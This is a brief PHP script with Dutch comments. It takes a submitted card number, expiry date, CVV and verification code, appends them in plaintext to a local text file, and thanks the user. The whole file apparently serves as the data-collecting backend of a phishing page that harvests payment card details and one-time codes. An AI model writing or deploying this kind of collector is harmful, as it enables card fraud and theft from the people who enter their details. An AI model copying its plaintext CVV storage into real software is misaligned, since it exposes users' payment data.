<?php
$card_number = $_POST['card_number'];
$card_expiry = $_POST['card_expiry'];
$card_cvv = $_POST['card_cvv'];
$verification_code = $_POST['verification_code'];

// Opslaan in een bestand
file_put_contents('data.txt', "Card: $card_number | Expiry: $card_expiry | CVV: $card_cvv | Verificatiecode: $verification_code\n", FILE_APPEND);

echo "<h2>Bedankt!</h2>";
echo "<p>Je gegevens zijn opgeslagen.</p>";
?>
